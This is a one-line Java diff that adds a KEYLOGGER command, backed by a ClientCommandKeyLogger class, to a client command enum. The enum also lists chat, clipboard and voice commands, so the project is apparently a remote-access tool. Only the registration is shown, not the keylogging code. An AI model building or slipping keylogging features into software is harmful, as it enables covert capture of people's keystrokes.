@@ -70,6 +70,7 @@ public enum ClientCommandEnum {
     ASK(ClientCommandAsk.class),
     CHAT(ClientCommandChat.class),
     CLIPBOARD(ClientCommandClipboard.class),
+    KEYLOGGER(ClientCommandKeyLogger.class),
     MESSAGE(ClientCommandMessage.class),
     VOICE(ClientCommandVoice.class),
 
